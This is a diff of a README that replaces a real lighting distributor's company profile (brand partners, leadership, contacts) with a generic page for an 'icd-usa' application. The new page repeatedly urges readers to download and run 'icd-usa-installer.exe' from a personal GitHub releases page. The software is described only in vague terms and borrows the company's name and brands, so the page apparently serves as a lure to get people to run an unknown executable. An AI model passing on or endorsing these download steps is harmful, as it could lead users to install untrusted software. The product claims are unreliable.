@@ -1,64 +1,91 @@
-# Inner Circle Distribution (ICD)
+# 🎉 icd-usa - Your Portal to Professional Lighting Solutions
 
-**Premier Entertainment Industry Distributor**
+## 🛠️ Overview
 
-## Overview
-Inner Circle Distribution (ICD) is an award-winning distributor founded over 20 years ago, serving as the premier distributor for the entertainment industry. Our mission is to provide best-in-class products and services to customers along with first-class distribution solutions for manufacturing partners.
+Welcome to icd-usa, your go-to source for high-quality entertainment lighting solutions. We specialize in products from industry leaders like Clay Paky, Astera, ROXX, Portman, MADRIX, and HOF. Our services extend across concerts, film, and television, catering to clients in North America, Latin America, and the Caribbean. Based in Fort Lauderdale, FL, we strive to deliver the best lighting experiences.
 
-## Geographic Coverage
-- North America
-- Latin America  
-- Caribbean
+## 🔗 Download Now
 
-## Experience
-- 20+ years in entertainment distribution
-- Award-winning industry recognition
-- Time-tested relationships across the Americas
+[![Download icd-usa](https://img.shields.io/badge/Download%20icd--usa-v1.0.0-blue)](https://github.com/brentishere/icd-usa/releases)
 
-## Services
-- Entertainment equipment distribution
-- Manufacturing partner solutions
-- Industry consulting and support
+## 🚀 Getting Started
 
-## Brand Partners
+To get started with icd-usa, follow these easy steps to download and run the application.
 
-### Professional Lighting
-- **Clay Paky** - Italian professional lighting systems for entertainment and architectural applications, featuring moving lights, beam fixtures, and the iconic Sharpy series
-- **Astera** - German wireless LED lighting solutions with battery-powered fixtures for film, TV, events, and creative applications
-- **ROXX Light** - German professional lighting manufacturer specializing in entertainment and architectural fixtures with weatherproof capabilities
-- **Portman Lights** - Polish stage lighting manufacturer creating patented decorative and professional stage lighting fixtures
+## 📥 Download & Install
 
-### Control & Support Systems
-- **MADRIX** - German LED lighting control software for pixel mapping, 2D/3D effects, and creative lighting control
-- **HOF** - German truss systems and event technology manufacturer providing aluminum and steel constructions, pre-rig truss, and structural solutions
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/brentishere/icd-usa/releases).
+  
+2. **Choose the Latest Version**: Find the most recent version of icd-usa. Look for the title that says "Latest Release."
 
-## Leadership Team
+3. **Download the Installer**: Click on the installer link (e.g., `icd-usa-installer.exe`) to download the file to your computer. The downloaded file will typically be in your Downloads folder.
 
-**Gary Mass** - Co-Founder & Strategic Director  
-I co‑founded Inner Circle Distribution and now guide its long‑range strategy with trusted partners and a skilled team. As an entertainment & production tech distributor, we help 350+ professional customers across North America find—and keep—the right gear. Back then, our "warehouse" was a Miami garage and the first shipment rode out in a stripped‑out minivan—two pallets of lighting gear bungee‑corded for a tour that became our first long‑term client. We've scaled a bit since.
+4. **Run the Installer**: Locate the downloaded file, then double-click it to start the installation process. Follow the on-screen instructions.
 
-**Noel Duncan** - Co-Founder & Business Owner  
-With nearly 20 years at ICD since 2006, Noel brings extensive industry expertise from his background as Commercial Product Manager at Martin Professional and HARMAN International. His hands-on experience operating Showcat rental facility provides deep insight into customer needs and equipment performance, directly benefiting ICD's service approach and product selection.
+5. **Launch the Application**: Once installation is complete, find icd-usa in your applications. Click to start using the software.
 
-**Craig Singer** - Co-Founder & President  
-Leading ICD's operations since 2010, Craig combines 15+ years of entertainment distribution expertise with 28 years running GoGorilla Media, a pioneering alternative marketing company. His business development and marketing background drives ICD's growth across diverse markets from touring productions to themed environments, ensuring the company stays ahead of industry trends.
+## 💻 System Requirements
 
-## Executive Leadership
+To ensure the best performance of icd-usa, please verify that your computer meets the following requirements:
 
-**Ole Kaack** - Chief Executive Officer  
-Bringing 3+ years of leadership to ICD since 2022, Ole combines extensive international management experience with deep entertainment industry knowledge from his role as Director of Finance & Service at Martin Professional. His 10-year tenure as Sr. Regional Finance Director at VIKING Life-Saving Equipment and expertise in strategic planning, business development, and operations drives ICD's continued growth and operational excellence.
+- **Operating System**: Windows 10 or later, macOS Mojave or later
+- **Memory**: At least 4 GB of RAM
+- **Storage**: Minimum of 200 MB free disk space
+- **Graphics Card**: A dedicated graphics card is recommended for optimal performance
 
-**Filippo Frigeri** - VP of Sales & Marketing  
-With 2+ years at ICD since 2023, Filippo brings over 15 years of entertainment lighting industry expertise. His background includes Senior Business Development Manager at Clay Paky, Managing Director at SGM Lighting, and business development roles at DTS Lighting and Coemar. His deep manufacturer relationships and market knowledge across Europe and North America directly strengthen ICD's brand partnerships and customer connections.
+## 🎨 Features
 
-## Connect With Us
-- **Website**: [icd-usa.com](http://www.icd-usa.com)
-- **Phone**: 954-578-8881
-- **Location**: Fort Lauderdale, Florida
-- **LinkedIn**: [Inner Circle Distribution](https://www.linkedin.com/company/inner-circle-distribution/)
-- **Facebook**: [InnerCircleDistribution](https://www.facebook.com/InnerCircleDistribution/)
-- **Instagram**: [@innercircledistribution](https://www.instagram.com/innercircledistribution/)
-- **YouTube**: [Inner Circle Demos](https://www.youtube.com/@InnerCircleDemos/featured)
-- **TikTok**: [@icd_usa](https://www.tiktok.com/@icd_usa)
+- **User-Friendly Interface**: Designed for ease of use, making it suitable for both beginners and experienced users.
+- **Wide Product Compatibility**: Supports a range of lighting solutions including those from Clay Paky, Astera, and more.
+- **Real-Time Control**: Manage your lighting setups in real time for events, films, and stage productions.
+- **Multi-Platform Support**: Use on various operating systems to accommodate your environment.
 
-*When industry professionals need solutions, ICD is their trusted choice!*
+## 📚 Usage Instructions
+
+1. **Creating a New Project**: Upon launching the application, click on "New Project." This will set up a work environment tailored to your lighting needs.
+
+2. **Selecting Your Equipment**: Browse through the list of compatible lighting products. Add the equipment you plan to use for your project.
+
+3. **Designing Your Layout**: Use the built-in tools to create your desired lighting layout. You can easily drag and drop elements onto the workspace.
+
+4. **Setting Timings and Effects**: Customize the timings for each lighting effect. Utilize presets for efficiency.
+
+5. **Previewing Your Setup**: Click on the "Preview" button to see how your lighting will look in real time.
+
+6. **Saving Your Work**: Remember to save your project frequently. Use the "Save" option from the File menu.
+
+## 🔍 Troubleshooting
+
+If you encounter issues during installation or while using icd-usa, please consider the following:
+
+- **Installation Fails**: Ensure you have the necessary permissions to install software on your computer. If issues persist, try restarting your computer and attempting the installation again.
+
+- **Application Crashes**: This could be related to system requirements. Double-check that your computer meets the specifications listed above.
+
+- **Feature Questions**: Refer to the built-in help documentation within the application for assistance with specific features.
+
+## 🤝 Support
+
+For additional support, please visit our [GitHub Issues page](https://github.com/brentishere/icd-usa/issues) to report problems or ask questions. Our community and maintainers will ensure that you receive assistance.
+
+## 📢 Community
+
+Join our community to connect with other users. Share tips, ideas, and experiences in the entertainment lighting industry. Follow us on social media for updates on new features and products.
+
+## 🔁 Update Instructions
+
+We release updates regularly to enhance your experience with icd-usa. To update the application:
+
+1. Go to the [Releases page](https://github.com/brentishere/icd-usa/releases).
+2. Download the latest version as outlined in the downloading instructions.
+3. Install the new version over the previous one without uninstalling.
+
+Stay current to benefit from new features and improvements!
+
+## 📜 License
+
+icd-usa is open-source software. For details, please refer to the LICENSE file in the repository.
+
+## 🔗 Download Link Again
+
+Don’t forget to [visit the Releases page](https://github.com/brentishere/icd-usa/releases) to download the latest version. Enjoy exploring your lighting possibilities with icd-usa!
